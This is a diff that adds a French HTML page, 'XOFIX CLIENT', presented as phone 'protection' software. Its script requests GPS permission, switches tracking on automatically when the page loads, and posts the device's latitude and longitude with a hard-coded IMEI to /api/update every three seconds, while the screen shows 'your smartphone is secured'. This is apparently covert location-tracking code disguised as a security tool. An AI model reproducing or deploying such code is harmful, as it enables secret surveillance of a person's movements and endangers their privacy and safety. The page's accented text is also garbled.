@@ -1,0 +1,115 @@
+﻿<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <link rel='manifest' href='/static/manifest.json'>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>XOFIX CLIENT - Protection Active</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: #060913; color: #e2e8f0;
+            margin: 0; padding: 20px;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            height: 100vh; box-sizing: border-box; text-align: center;
+        }
+        .logo {
+            font-size: 42px; font-weight: 900; letter-spacing: 4px;
+            background: linear-gradient(135deg, #aa7c11 0%, #d4af37 100%);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin-bottom: 5px;
+        }
+        .shield-btn {
+            width: 180px; height: 180px; border-radius: 50%;
+            background: radial-gradient(circle, #1e293b 0%, #0f172a 100%);
+            border: 4px solid #aa7c11; color: #d4af37;
+            font-size: 16px; font-weight: bold; cursor: pointer;
+            box-shadow: 0 0 30px rgba(212, 175, 55, 0.2);
+            transition: 0.3s; margin: 30px 0;
+            text-transform: uppercase; letter-spacing: 1px;
+        }
+        .shield-active {
+            border-color: #34d399; color: #34d399;
+            box-shadow: 0 0 40px rgba(52, 211, 153, 0.4);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
+        }
+        .status-text { font-size: 18px; color: #94a3b8; font-weight: 500; }
+        .imei { font-size: 11px; color: #475569; margin-top: 20px; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="logo">XOFIX</div>
+    <div style="color: #64748b; font-size: 12px; letter-spacing: 2px;">PROTECTION ACTIVE</div>
+
+    <button id="main-btn" class="shield-btn" onclick="basculerProtection()">Activer<br>Protection</button>
+
+    <div id="status" class="status-text">SystÃ¨me en attente...</div>
+    <div class="imei">ID APPAREIL : 123456789012345</div>
+
+    <script>
+        let trackingInterval = null;
+        let running = false;
+
+        function basculerProtection() {
+            const btn = document.getElementById('main-btn');
+            const status = document.getElementById('status');
+
+            if (!running) {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(() => {
+                        running = true;
+                        btn.innerHTML = "SystÃ¨me<br>Actif";
+                        btn.className = "shield-btn shield-active";
+                        status.innerText = "?? Votre smartphone est sÃ©curisÃ©";
+                        status.style.color = "#34d399";
+                        
+                        trackingInterval = setInterval(envoyerPositionClient, 3000);
+                        envoyerPositionClient();
+                    }, () => {
+                        alert("Erreur : Veuillez autoriser l'accÃ¨s GPS pour XOFIX.");
+                    });
+                }
+            } else {
+                clearInterval(trackingInterval);
+                running = false;
+                btn.innerHTML = "Activer<br>Protection";
+                btn.className = "shield-btn";
+                status.innerText = "SystÃ¨me en attente...";
+                status.style.color = "#94a3b8";
+            }
+        }
+
+        function envoyerPositionClient() {
+            navigator.geolocation.getCurrentPosition(position => {
+                const data = {
+                    imei: "123456789012345",
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude
+                };
+
+                fetch('/api/update', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).catch(err => console.error("Erreur transmission XOFIX:", err));
+            });
+        }
+    
+// Activation automatique du systÃ¨me XOFIX
+document.addEventListener('DOMContentLoaded', () => { setTimeout(() => { if (typeof basculerProtection === 'function') { basculerProtection(); } }, 500); });
+</script>
+<script>
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/static/sw.js')
+    .then(() => console.log('Service Worker XOFIX enregistré avec succès.'))
+    .catch(err => console.error('Échec enregistrement SW:', err));
+}
+</script>
+</body>
+</html>
